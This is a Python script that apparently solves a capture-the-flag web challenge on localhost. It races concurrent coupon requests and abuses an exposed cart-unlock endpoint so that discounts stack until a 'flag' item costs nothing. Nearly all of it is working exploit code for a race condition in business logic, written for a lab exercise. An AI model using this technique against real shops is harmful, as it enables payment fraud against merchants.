import requests
import threading
import time

URL = "http://localhost:5001"
s = requests.Session()

def solve():
    print("[*] Starting Arbitrage Hard Exploit...")

    # 1. Login
    print("[*] Registering user...")
    res = s.post(f"{URL}/register", data={"username": "hacker"})
    if res.status_code != 200:
        print("[-] Registration failed")
        return

    # 2. Add Flag (Price: 1000)
    print("[*] Adding Flag to cart...")
    s.post(f"{URL}/cart/add", data={"item": "flag"})

    # 3. Exploit Loop
    # We need to stack coupons.
    # Strategy: Apply -> Sleep(500ms) -> Unlock -> Apply -> Sleep(500ms) -> Unlock ...
    # If we do this fast enough, we can get multiple "Apply" requests sleeping at the same time.
    
    print("[*] Launching attack threads...")
    threads = []
    
    def attack_step():
        res = s.post(f"{URL}/cart/apply_coupon", data={"code": "SHADOW_DISCOUNT"})
        # print(res.text)

    # We need 10 coupons ($100 * 10 = $1000).
    # Let's try to launch 15 to be safe.
    for i in range(15):
        t = threading.Thread(target=attack_step)
        threads.append(t)
        t.start()
        
        # Wait a tiny bit for the request to hit the lock and sleep
        time.sleep(0.05)
        
        # Force unlock so the next thread can enter
        s.post(f"{URL}/api/support/unlock_cart")
        print(f"[*] Thread {i+1} launched and cart unlocked")

    # Wait for all threads to finish
    for t in threads:
        t.join()

    # 4. Checkout
    print("[*] Checking out...")
    res = s.post(f"{URL}/checkout/pay").json()
    
    if res.get('status') == 'win':
        print(f"[+] WIN! Flag: {res.get('flag')}")
    else:
        print(f"[-] Failed. Response: {res}")

if __name__ == "__main__":
    solve()
